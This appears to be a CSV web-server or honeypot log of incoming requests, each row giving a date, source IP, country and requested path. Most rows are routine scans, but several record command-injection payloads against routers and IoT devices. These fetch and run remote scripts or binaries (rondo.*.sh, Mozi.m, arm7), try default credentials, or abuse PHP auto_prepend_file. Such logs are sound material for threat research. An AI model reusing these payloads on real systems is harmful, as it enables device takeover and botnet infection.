"2025-10-19","35.203.210.138","United Kingdom","HTTP","/.well-known/security.txt"
"2025-10-19","124.198.131.83","United States","HTTP","/wget_test.asp?url=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.rwx.sh%7Csh%60\u0026count=1"
"2025-10-19","176.65.149.30","The Netherlands","HTTP","/login"
"2025-10-19","206.168.34.33","United States","HTTP","/login"
"2025-10-19","124.198.131.83","United States","HTTP","/goform/exeCommand?cmdinput=%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.uzz.sh%7Csh%3B"
"2025-10-19","157.230.240.140","Singapore","HTTP","/download/powershell/"
"2025-10-19","157.230.240.140","Singapore","HTTP","/get.php"
"2025-10-19","167.94.138.49","United States","HTTP","/login"
"2025-10-19","195.170.172.128","Spain","HTTP","/WuEL"
"2025-10-19","195.170.172.128","Spain","HTTP","/a"
"2025-10-19","195.170.172.128","Spain","HTTP","/download/file.ext"
"2025-10-19","195.170.172.128","Spain","HTTP","/SiteLoader"
"2025-10-19","195.170.172.128","Spain","HTTP","/mPlayer"
"2025-10-19","124.198.131.83","United States","HTTP","/goform/setSysAdm"
"2025-10-19","45.58.127.135","United States","HTTP","/robots.txt"
"2025-10-19","124.198.131.83","United States","HTTP","/goform/SystemCommand"
"2025-10-19","20.40.250.19","United States","HTTP","/developmentserver/metadatauploader"
"2025-10-19","138.36.155.73","Mexico","HTTP","/robots.txt"
"2025-10-19","79.124.40.174","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-19","124.198.131.83","United States","HTTP","/maker/snwrite.cgi?mac=1234%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.eby.sh%7Csh"
"2025-10-19","192.241.253.43","United States","HTTP","/.env"
"2025-10-19","192.241.253.43","United States","HTTP","/.git/config"
"2025-10-19","124.198.131.83","United States","HTTP","/boafrm/formWsc"
"2025-10-19","207.154.231.139","Germany","HTTP","/favicon.ico"
"2025-10-19","79.124.40.174","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-19","167.94.146.58","United States","HTTP","/favicon.ico"
"2025-10-19","167.94.146.58","United States","HTTP","/favicon.ico"
"2025-10-19","167.94.146.58","United States","HTTP","/.well-known/security.txt"
"2025-10-19","176.65.149.30","The Netherlands","HTTP","/login"
"2025-10-19","196.251.72.177","Seychelles","HTTP","/.env"
"2025-10-19","117.215.55.122","India","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=rm+-rf+/tmp/*;wget+http://117.254.100.203:41791/Mozi.m+-O+/tmp/netgear;sh+netgear\u0026curpath=/\u0026currentsetting.htm=1"
"2025-10-19","95.111.249.3","France","HTTP","/api/.env"
"2025-10-19","87.120.191.37","United States","HTTP","http://ip-api.com/json/"
"2025-10-19","195.184.76.3","United States","HTTP","/favicon.ico"
"2025-10-19","45.82.78.114","Germany","HTTP","/favicon.ico"
"2025-10-19","45.58.127.135","United States","HTTP","/robots.txt"
"2025-10-19","184.105.139.69","United States","HTTP","/favicon.ico"
"2025-10-19","184.105.139.69","United States","HTTP","/geoserver/web/"
"2025-10-19","216.218.206.115","United States","HTTP","http://api.ipify.org/?format=json"
"2025-10-19","216.218.206.67","United States","HTTP","/geoserver/web/"
"2025-10-19","123.160.223.72","China","HTTP","/favicon.ico"
"2025-10-19","111.235.228.136","Taiwan","HTTP","/boaform/admin/formLogin?username=ec8\u0026psd=ec8"
"2025-10-19","45.82.78.113","Germany","HTTP","/favicon.ico"
"2025-10-19","45.153.34.54","The Netherlands","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F23.177.185.39%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk"
"2025-10-19","198.98.53.110","United States","HTTP","/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
